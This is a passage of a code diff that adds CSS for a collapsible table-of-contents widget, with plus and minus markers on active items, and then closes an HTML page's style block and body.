+ 
+.widget--toc .toc .nav > li.active > ul {
+    display: block !important;
+}
+
+ 
+.widget--toc .toc .nav > li > a {
+    position: relative;
+    padding-right: 20px;  
+}
+
+ 
+.widget--toc .toc .nav > li > a::after {
+    content: '+';
+    position: absolute;
+    right: 0;
+    top: 50%;
+    transform: translateY(-50%);
+    font-size: 0.8em;
+    color: #999;
+    transition: transform 0.2s;
+}
+
+ 
+.widget--toc .toc .nav > li.active > a::after {
+    content: '-';
+    color: #333;
+}
+</style>
+
+    </body>
+</html>
